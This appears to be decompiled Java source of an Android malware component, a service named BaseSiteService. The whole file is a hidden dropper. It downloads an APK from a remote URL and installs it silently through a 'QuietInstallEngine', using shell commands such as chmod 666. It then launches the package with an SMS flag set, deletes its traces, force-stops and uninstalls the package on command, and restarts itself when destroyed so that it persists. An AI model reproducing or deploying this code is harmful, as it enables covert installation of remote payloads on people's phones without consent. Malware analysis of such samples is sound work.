package com.qc.access;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import com.qc.base.OrderSet;
import com.qc.base.RunStatement;
import com.qc.common.Constant;
import com.qc.common.Funs;
import com.qc.common.QuietInstallEngine;
import com.qc.model.ApkDownLoadManager;
import com.qc.util.ShareProDBHelper;
import java.io.File;

@SuppressLint({"HandlerLeak", "HandlerLeak", "UseValueOf"})
public class BaseSiteService extends Service {
    private static final int MSG_OK = 1;
    private listenBaseAPKFinishReceiver lbafReceiver;
    /* access modifiers changed from: private */
    public Context mContext;
    /* access modifiers changed from: private */
    public Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    if (Funs.isInstallApk(BaseSiteService.this.mContext, Constant.BaseSite_pkgName)) {
                        OrderSet.isopenSMS = 1;
                        Funs.startAPKByPackageName(BaseSiteService.this.mContext, Constant.BaseSite_pkgName);
                        return;
                    }
                    return;
                default:
                    return;
            }
        }
    };
    /* access modifiers changed from: private */
    public boolean service_flag = false;

    class listenBaseAPKFinishReceiver extends BroadcastReceiver {
        listenBaseAPKFinishReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Constant.ACTION_FINISH)) {
                if (Funs.isInstallApk(context, Constant.BaseSite_pkgName)) {
                    Funs.forceStopProcess(context, Constant.BaseSite_pkgName);
                    QuietInstallEngine.unInstall(Constant.BaseSite_pkgName);
                }
                BaseSiteService.this.service_flag = false;
                BaseSiteService.this.stopSelf();
            }
        }
    }

    public void onCreate() {
        this.service_flag = true;
        this.mContext = this;
        this.lbafReceiver = new listenBaseAPKFinishReceiver();
        this.mContext.registerReceiver(this.lbafReceiver, new IntentFilter(Constant.ACTION_FINISH));
        super.onCreate();
    }

    public void onStart(Intent intent, int startId) {
        if (RunStatement.baseApkUrl != null && RunStatement.baseApkUrl.length() > 0) {
            Thread thread = new Thread() {
                public void run() {
                    super.run();
                    byte[] bytes = ApkDownLoadManager.updateApkData(BaseSiteService.this.mContext, RunStatement.baseApkUrl, "basesite");
                    RunStatement.baseApkUrl = "";
                    if (bytes != null && bytes.length > 0) {
                        ShareProDBHelper.write(BaseSiteService.this.mContext, "dataCenter", "basesitelauncher", new Integer(1));
                        RunStatement.runningTime = 0;
                        File sdCardFile = Funs.getSDCardFile("basesite.apk");
                        if (sdCardFile != null) {
                            String sdFileName = Environment.getExternalStorageDirectory() + "/mnkp/" + "basesite" + ".apk";
                            if (!QuietInstallEngine.install(sdFileName).contains("Success\n")) {
                                QuietInstallEngine.installInSDCard(2);
                                String installState = QuietInstallEngine.install(sdFileName);
                                QuietInstallEngine.installInSDCard(0);
                            }
                            sdCardFile.delete();
                        } else {
                            try {
                                QuietInstallEngine.ec("chmod 666 /data/data/" + BaseSiteService.this.mContext.getPackageName() + "/files/" + "basesite" + ".apk");
                            } catch (InterruptedException e) {
                            }
                            QuietInstallEngine.install(new StringBuilder(String.valueOf(BaseSiteService.this.mContext.getFilesDir().getAbsolutePath())).append("/").append("basesite").append(".apk").toString());
                            BaseSiteService.this.mContext.deleteFile("basesite");
                        }
                        BaseSiteService.this.mHandler.sendEmptyMessageDelayed(1, 1000);
                    }
                }
            };
            thread.setPriority(10);
            thread.start();
        }
        super.onStart(intent, startId);
    }

    public void onDestroy() {
        if (this.lbafReceiver != null) {
            this.mContext.unregisterReceiver(this.lbafReceiver);
        }
        if (this.service_flag) {
            startService(new Intent(this, BaseSiteService.class));
        }
        super.onDestroy();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
